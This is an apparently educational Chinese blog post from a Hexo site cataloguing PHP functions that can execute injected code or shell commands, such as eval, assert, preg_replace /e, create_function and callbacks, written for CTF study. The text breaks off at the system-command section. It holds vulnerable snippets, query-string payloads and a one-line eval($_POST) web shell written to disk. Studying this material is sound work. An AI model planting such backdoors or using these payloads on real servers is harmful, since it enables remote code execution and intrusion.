<!DOCTYPE html>



  

<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
<script type="text/javascript" src="/js/src/custom.js"></script>
<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/favicon-32x32-next.png?v=5.1.4" color="#222">





  <meta name="keywords" content="命令执行,">





  <link rel="alternate" href="/atom.xml" title="MuseLJH's blog" type="application/atom+xml">






<meta name="description" content="总结下关于命令执行以及绕过方面的知识">
<meta name="keywords" content="命令执行">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP命令&amp;执行&amp;绕过">
<meta property="og:url" content="https://museljh.github.io/2019/05/15/命令&执行&绕过/index.html">
<meta property="og:site_name" content="MuseLJH&#39;s blog">
<meta property="og:description" content="总结下关于命令执行以及绕过方面的知识">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-05-30T13:32:38.383Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PHP命令&amp;执行&amp;绕过">
<meta name="twitter:description" content="总结下关于命令执行以及绕过方面的知识">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://museljh.github.io/2019/05/15/命令&执行&绕过/">





  <title>PHP命令&执行&绕过 | MuseLJH's blog</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

<a href="https://github.com/MuseLJH" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

  <div class=" page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">MuseLJH's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">MuseLJH's blog</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://museljh.github.io/2019/05/15/命令&执行&绕过/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="MuseLJH">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LJH.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MuseLJH's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">PHP命令&执行&绕过</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-15T17:41:18+08:00">
                2019-05-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/文章/" itemprop="url" rel="index">
                    <span itemprop="name">文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2019/05/15/命令&执行&绕过/" class="leancloud_visitors" data-flag-title="PHP命令&执行&绕过">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  25
                </span>
              
            </div>
          

          
              <div class="post-description">
                  总结下关于命令执行以及绕过方面的知识
              </div>
          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="一、命令执行-写shell"><a href="#一、命令执行-写shell" class="headerlink" title="一、命令执行/写shell"></a>一、命令执行/写shell</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a><code>eval</code></h3><h3 id="fputs"><a href="#fputs" class="headerlink" title="fputs"></a><code>fputs</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(&apos;t.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1])?&gt;&apos;)</span><br></pre></td></tr></table></figure>

<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace ===="></a><code>preg_replace</code> ====</h3><p><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>5.6以下可以执行</p>
<p>5.6以上仍然可以执行，但是会有警告</p>
<p>PHP7后已经不支持/e修饰符</p>
<p>2.1、</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$regexp = $_GET[&apos;reg&apos;];</span><br><span class="line">$var = &apos;&lt;php&gt;phpinfo()&lt;/php&gt;&apos;;</span><br><span class="line">preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &apos;\\1&apos;, $var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>reg=%3C/php%3E/e</p>
<p>2.2、</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>cmd=phpinfo()</p>
<p>2.3、</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">preg_replace(&quot;/\s*\[php\](.+?)\[\/php\]\s*/ies&quot;, &quot;\\1&quot;, $_GET[&apos;h&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>h=[php]phpinfo()[/php]</p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert() ===="></a><code>assert()</code> ====</h3><p><code>bool assert ( mixed $assertion [, string $description ] )</code></p>
<p>将字符串当成PHP代码执行</p>
<p>在PHP7后已经不是一个函数，而是一种语言结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	assert($_GET[&apos;pass&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>pass=phpinfo()</p>
<p>注意：phpinfo()可以不加分号;</p>
<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a><code>call_user_func()</code></h3><p><code>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</code></p>
<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func($_GET[&apos;museljh&apos;], $_GET[&apos;museljh&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在PHP7.0依旧可以<code>museljh=assert&amp;museljh=phpinfo()</code>,使用eval进行代码执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func(function($a)&#123;eval($a);&#125;,$_GET[&apos;museljh&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a><code>call_user_func_array()</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array ( callable $callback , array $param_arr )</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func_array($_GET[&apos;user&apos;],$_GET[&apos;pass&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>call_user_func_array(function($a){eval($a);},$_GET[&#39;museljh&#39;]);</code><br><code>http://127.0.0.1/1.php?museljh[]=echo 2;</code></p>
<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function  ===="></a><code>create_function</code>  ====</h3><p><code>string create_function ( string $args , string $code )</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a = $_GET[&apos;museljh&apos;];</span><br><span class="line">	$b = create_function(&apos;$a&apos;,&quot;echo $a&quot;);</span><br><span class="line">	$b(&apos;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>127.0.0.1/?museljh=phpinfo();</code></p>
<p>在ctf比赛中<code>create_function</code>常常可以用截断来进行利用,主要是由于这个函数里有内部有调用eval函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function sname($name)&#123;</span><br><span class="line">	echo $name.&quot;xxx&quot;.$id;</span><br><span class="line">	&#125;</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">	$id=$_GET[&apos;id&apos;];</span><br><span class="line">	$code = &apos;echo $name.&apos;.&apos;xxx&apos;.$id.&apos;; &apos;;</span><br><span class="line">	$a = create_function(&apos;$name&apos;,$code);</span><br><span class="line">	$a(&apos;pass&apos;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">	echo 1;</span><br><span class="line">&#125;</span><br><span class="line">127.0.0.1/?id=;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>

<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a><code>array_filter()</code></h3><p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code></p>
<p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$array[0] = $_GET[&apos;a&apos;];</span><br><span class="line">array_filter($array,&apos;assert&apos;);</span><br></pre></td></tr></table></figure>

<p><code>127.0.0.1/?a=phpinfo()</code></p>
<h3 id="usort-uasort-uksort"><a href="#usort-uasort-uksort" class="headerlink" title="usort()/uasort()/uksort()"></a><code>usort()/uasort()/uksort()</code></h3><p><code>usort ( array &amp;$array , callable $value_compare_func ) : bool</code><br>usort — 使用用户自定义的比较函数对数组中的值进行排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//php5.6版本以下 </span><br><span class="line">   usort($_GET,&apos;system&apos;);    //xxx.php?1=1&amp;2=whoami</span><br><span class="line">   //usort($_GET,&apos;assert&apos;);   //xxx.php?1=1&amp;2=phpinfo()</span><br><span class="line">//php5.6以上</span><br><span class="line">   //usort(...$_GET);   xxx.php?1[]=1-1&amp;1[]=eval($_POST[&apos;x&apos;])&amp;2=assert</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//php5.6以上</span><br><span class="line">&lt;?php usort([&apos;$a=0&apos;,&apos;eval($_POST[&quot;x&quot;])&apos;],&apos;assert&apos;);?&gt;</span><br></pre></td></tr></table></figure>

<p>这里有个有趣的地方…运算符这是php5.6的新特性，在调用函数的时候，使用 … 运算符， 将 数组 和 可遍历 对象展开为函数参数。其实原理并没有发生什么变化，最终能够执行函数并非是usort而是eval。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function add($a, $b, $c) &#123;</span><br><span class="line">    return $a + $b + $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$operators = [2, 3];</span><br><span class="line">echo add(1, ...$operators);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上述例子会输出6</p>
<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a><code>ob_start</code></h3><p><code>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</code><br>ob_start — 打开输出控制缓冲</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd = &apos;system&apos;;</span><br><span class="line">	ob_start($cmd);</span><br><span class="line">	echo &quot;$_GET[a]&quot;;</span><br><span class="line">	ob_end_flush();</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>?a=whoami<br><code>ob_start</code>为打开输出缓冲，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中,如上例子也就是echo。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p>
<h3 id="可变函数-var-args"><a href="#可变函数-var-args" class="headerlink" title="可变函数$var(args)"></a><code>可变函数$var(args)</code></h3><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>?a=system&amp;b=whoami<br>?a=assert&amp;b=phpinfo()</p>
<h3 id=""><a href="#" class="headerlink" title="\$"></a><code>\$</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$&#123;phpinfo()&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map ===="></a><code>array_map</code> ====</h3><p><code>array array_map ( callable $callback , array $array1 [, array $... ] )</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;a&apos;];</span><br><span class="line">$b = $_GET[&apos;b&apos;];</span><br><span class="line">$array[0] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>?a=assert&amp;b=phpinfo();</p>
<p><code>$evil_callback</code>为回调函数，将<code>$some_array</code>作为参数传入回调函数进行执行</p>
<p>这里需要注意<code>$evil_callback</code>没有括号()和分号;</p>
<p>目前来说全版本都可以使用</p>
<h3 id="、array-walk-array-walk-recursive-register-shutdown-function-preg-replace-callback-array-reduce"><a href="#、array-walk-array-walk-recursive-register-shutdown-function-preg-replace-callback-array-reduce" class="headerlink" title="、array_walk/array_walk_recursive/register_shutdown_function/preg_replace_callback/array_reduce"></a>、<code>array_walk/array_walk_recursive/register_shutdown_function/preg_replace_callback/array_reduce</code></h3><p>1.<code>array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] ) : bool</code></p>
<p><code>array_walk</code> — 使用用户自定义函数对数组中的每个元素做回调处理</p>
<p>2.<code>array_walk_recursive</code></p>
<p><code>array_walk_recursive</code> — 对数组中的每个成员递归地应用用户函数</p>
<p>3.<code>register_shutdown_function</code> </p>
<p><code>register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] ) : void</code></p>
<p><code>register_shutdown_function</code> — 注册一个会在php中止时执行的函数</p>
<p>4.<code>preg_replace_callback</code></p>
<p><code>preg_replace_callback</code> — 执行一个正则表达式搜索并且使用一个回调进行替换</p>
<p><code>preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></p>
<p>5.<code>array_reduce</code></p>
<p>array_reduce — 用回调函数迭代地将数组简化为单一的值</p>
<p><code>array_reduce( array $array , callable $callback [, mixed $initial = NULL ] ) : mixed</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php array_walk($_GET[&apos;cmd&apos;],&apos;system&apos;);</span><br><span class="line">array_reduce($_GET[&apos;cmd&apos;],&apos;system&apos;);</span><br><span class="line">array_walk_recursive($_GET[&apos;cmd&apos;],&apos;system&apos;); </span><br><span class="line">register_shutdown_function(&apos;system&apos;,$_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">?cmd[]=whoami</span><br></pre></td></tr></table></figure>

<p>总的来说都是用回调函数，没什么新意。</p>
<h3 id="stream-filter-register"><a href="#stream-filter-register" class="headerlink" title="stream_filter_register"></a><code>stream_filter_register</code></h3><p><code>stream_filter_register ( string $filtername , string $classname ) : bool</code></p>
<p><code>stream_filter_register — Register a user defined stream filter</code></p>
<p>允许您在与所有其他文件系统函数一起使用的任何已注册流上实现自己的过滤器 (such as fopen(), fread() etc.).</p>
<p>这个函数有些厉害，具体要怎么利用我还没搞清楚，感觉这个函数可以让我们自己写个fopen之类的函数？</p>
<h3 id="array-uintersect-uassoc"><a href="#array-uintersect-uassoc" class="headerlink" title="array_uintersect_uassoc"></a><code>array_uintersect_uassoc</code></h3><p><code>array_uintersect_uassoc</code> </p>
<p>— 带索引检查计算数组的交集，用单独的回调函数比较数据和索引</p>
<p><code>array_uintersect_uassoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func , callable $key_compare_func ) : array</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a1=array($_POST[&apos;cmd&apos;]);</span><br><span class="line">$a2=array($_POST[&apos;cmd&apos;]);</span><br><span class="line">$result=array_uintersect_uassoc($a1,$a2,&quot;assert&quot;,&quot;assert&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="xml-set-character-data-handler-xml-set-default-handler-xml-set-element-handler-xml-set-end-namespace-decl-handler-xml-set-external-entity-ref-handler-xml-set-notation-decl-handler-xml-set-processing-instruction-handler-xml-set-start-namespace-decl-handler-xml-set-unparsed-entity-decl-handler"><a href="#xml-set-character-data-handler-xml-set-default-handler-xml-set-element-handler-xml-set-end-namespace-decl-handler-xml-set-external-entity-ref-handler-xml-set-notation-decl-handler-xml-set-processing-instruction-handler-xml-set-start-namespace-decl-handler-xml-set-unparsed-entity-decl-handler" class="headerlink" title="xml_set_character_data_handler()/xml_set_default_handler()/xml_set_element_handler()/xml_set_end_namespace_decl_handler()/xml_set_external_entity_ref_handler()/xml_set_notation_decl_handler()/xml_set_processing_instruction_handler()/xml_set_start_namespace_decl_handler()/xml_set_unparsed_entity_decl_handler()/"></a><code>xml_set_character_data_handler()/xml_set_default_handler()/xml_set_element_handler()/xml_set_end_namespace_decl_handler()/xml_set_external_entity_ref_handler()/xml_set_notation_decl_handler()/xml_set_processing_instruction_handler()/xml_set_start_namespace_decl_handler()/xml_set_unparsed_entity_decl_handler()/</code></h3><p>如上xml解析同样面临回调问题</p>
<h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p>以下大多数函数都是利用类似回调函数的方法进行利用就不详细探究了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">create_function(),call_user_func_array(),</span><br><span class="line">call_user_func(),assert(),</span><br><span class="line">preg_replace(),eval(),</span><br><span class="line">array_walk_recursive(),array_walk,array_map,ob_start(),</span><br><span class="line">array_filter(),</span><br><span class="line">preg_replace_callback()，register_shutdown_function()</span><br><span class="line">array_reduce()，stream_filter_register()</span><br><span class="line">array_diff_uassoc(), array_diff_ukey()</span><br><span class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</span><br><span class="line">array_intersect_assoc(), array_intersect_uassoc()</span><br><span class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</span><br><span class="line">xml_set_character_data_handler()</span><br><span class="line">xml_set_default_handler()</span><br><span class="line">xml_set_element_handler()</span><br><span class="line">xml_set_end_namespace_decl_handler()</span><br><span class="line">xml_set_external_entity_ref_handler()</span><br><span class="line">xml_set_notation_decl_handler()</span><br><span class="line">xml_set_processing_instruction_handler()</span><br><span class="line">xml_set_start_namespace_decl_handler()</span><br><span class="line">xml_set_unparsed_entity_decl_handler()</span><br><span class="line">stream_filter_register()</span><br><span class="line">set_error_handler()</span><br><span class="line">register_shutdown_function()</span><br><span class="line">register_tick_function()</span><br></pre></td></tr></table></figure>

<h2 id="二、PHP执行系统外部命令函数"><a href="#二、PHP执行系统外部命令函数" class="headerlink" title="二、PHP执行系统外部命令函数"></a>二、PHP执行系统外部命令函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><code>system()</code></h3><p><code>system ( string $command [, int &amp;$return_var ] ) : string</code></p>
<p><code>php -r &quot;system(&#39;whoami&#39;);&quot;</code></p>
<p>输出结果</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><code>passthru()</code></h3><p><code>pcntl_exec</code> — 在当前进程空间执行指定程序</p>
<p><code>pcntl_exec ( string $path [, array $args [, array $envs ]] ) : void</code></p>
